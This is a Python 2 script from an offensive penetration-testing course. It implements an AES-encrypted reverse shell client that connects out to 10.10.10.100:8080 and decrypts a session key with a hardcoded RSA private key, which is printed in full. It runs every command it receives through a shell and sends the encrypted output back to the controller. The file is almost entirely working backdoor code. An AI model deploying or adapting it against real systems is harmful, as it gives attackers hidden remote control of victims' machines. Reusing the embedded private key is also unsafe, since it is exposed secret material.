# Python For Offensive PenTest: A Complete Practical Course - All rights reserved 
# Follow me on LinkedIn  https://jo.linkedin.com/in/python2

# Download Pycrypto for Windows - pycrypto 2.6 for win32 py 2.7
# http://www.voidspace.org.uk/python/modules.shtml#pycrypto

# Download Pycrypto source
# https://pypi.python.org/pypi/pycrypto
# For Kali, after extract the tar file, invoke "python setup.py install"

import socket                    
import subprocess                 

from Crypto.PublicKey import RSA
from Crypto.Cipher import AES


def GET_AES_KEY(KEY):
    privatekey = """-----BEGIN RSA PRIVATE KEY-----
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
-----END RSA PRIVATE KEY-----"""
    
    decryptor = RSA.importKey(privatekey)
    AES_Key = decryptor.decrypt(KEY)   
    return AES_Key



def encrypt(message):
    encrypto = AES.new(key, AES.MODE_CTR, counter=lambda: counter)
    return encrypto.encrypt(message)

def decrypt(message):
    decrypto = AES.new(key, AES.MODE_CTR, counter=lambda: counter)
    return  decrypto.decrypt(message) 



def connect():
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)        
    s.connect(('10.10.10.100', 8080))

    global key, counter

    x = s.recv(1024)


    key = GET_AES_KEY( x )
    print "Generated AES Key " + str(key)


    y = s.recv(1024)
    counter = GET_AES_KEY( y )

 
    while True:                                                 
        command =  decrypt(s.recv(1024))
        print ' We received: ' +  command
        
        if 'terminate' in command:                 
            s.close()
            break 
        
        else:                                                 
            CMD =  subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            s.send( encrypt (CMD.stdout.read() ) ) 
            s.send( encrypt (CMD.stderr.read())  ) 

def main ():
    connect()
main()











